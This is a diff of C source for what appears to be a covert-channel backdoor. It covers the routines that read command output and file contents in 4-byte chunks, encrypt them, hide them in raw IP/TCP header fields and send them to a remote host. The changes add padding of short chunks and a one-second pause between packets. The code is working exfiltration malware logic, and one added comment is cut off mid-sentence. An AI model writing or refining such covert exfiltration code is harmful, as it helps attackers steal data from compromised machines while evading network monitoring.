@@ -54,11 +54,12 @@ void executeSystemCall(char *command)
         // Pad any extra space with NULL bytes
         if (bytesRead != 4)
         {
-            for (bytesRead; bytesRead < 4; bytesRead++)
+            for (; bytesRead < 4; bytesRead++)
             {
                 line[bytesRead] = '\0';
             }
         }
+        
         // Copy the line and encrypt it
         fprintf(stderr, "%.4s", line);
         encryptedField = encrypt_data(line, date, bytesRead);
@@ -71,6 +72,9 @@ void executeSystemCall(char *command)
 
         sendto(socket, buffer, sizeof(struct ip) + sizeof(struct tcphdr), 0,
                (struct sockaddr *)&din, sizeof(din));
+        
+        // Pause for a bit to allow the client to receive packets and deal with
+        sleep(1);
     }
     
     // Send a FIN packet to signal end of transfer
@@ -176,6 +180,15 @@ static void processFile(char *filePath, int socket, char *buffer, struct sockadd
     // Read and send the file
     while ((bytesRead = fread(line, sizeof(char), 4, file)) > 0)
     {
+        // Pad any extra space with NULL bytes
+        if (bytesRead != 4)
+        {
+            for (; bytesRead < 4; bytesRead++)
+            {
+                line[bytesRead] = '\0';
+            }
+        }
+        
         // Copy the line and encrypt it
         encryptedField = encrypt_data(line, date, bytesRead);
         memcpy(buffer + sizeof(struct ip) + 4, encryptedField, sizeof(unsigned long));
@@ -187,6 +200,9 @@ static void processFile(char *filePath, int socket, char *buffer, struct sockadd
         
         sendto(socket, buffer, sizeof(struct ip) + sizeof(struct tcphdr), 0,
                (struct sockaddr *)din, sizeof(struct sockaddr_in));
+               
+        // Pause for a bit to allow the client to receive packets and deal with
+        sleep(1);
     }
 }
 
